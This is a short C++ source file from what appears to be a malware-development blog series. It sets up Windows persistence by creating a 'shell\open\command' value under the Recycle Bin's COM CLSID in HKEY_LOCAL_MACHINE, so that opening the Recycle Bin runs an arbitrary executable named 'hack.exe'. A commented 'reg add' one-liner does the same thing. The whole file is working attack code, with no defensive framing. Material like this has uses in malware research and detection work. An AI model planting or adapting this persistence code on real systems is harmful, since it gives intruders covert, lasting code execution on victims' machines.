/*
pers.cpp
windows persistence via
recycle bin COM extension handler
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  HKEY hkR = NULL;

  // shell
  const char* shell = "SOFTWARE\\Classes\\CLSID\\{450d8fba-ad25-11d0-98a8-0800361b1103}\\shell";

  // evil app
  const char* exe = "C:\\Users\\test\\Desktop\\hack.exe";

  // key
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)shell, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    res = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkR, NULL);
    if (res == ERROR_SUCCESS) {
        printf("ok\n");
      // update registry key value
      // reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{450d8fba-ad25-11d0-98a8-0800361b1103}\shell\open\command”
      // /ve /t REG_SZ /d "hack.exe" /f
      // RegSetValueEx(hkey, (LPCSTR)"open\\command", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
      RegSetValueEx(hkR, NULL, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
      RegCloseKey(hkR);
    // RegCloseKey(hkey);
    }
    else
        printf("bad\n");
    RegCloseKey(hkey);
  }
  else
    printf("%d\n",res);
  return 0;
}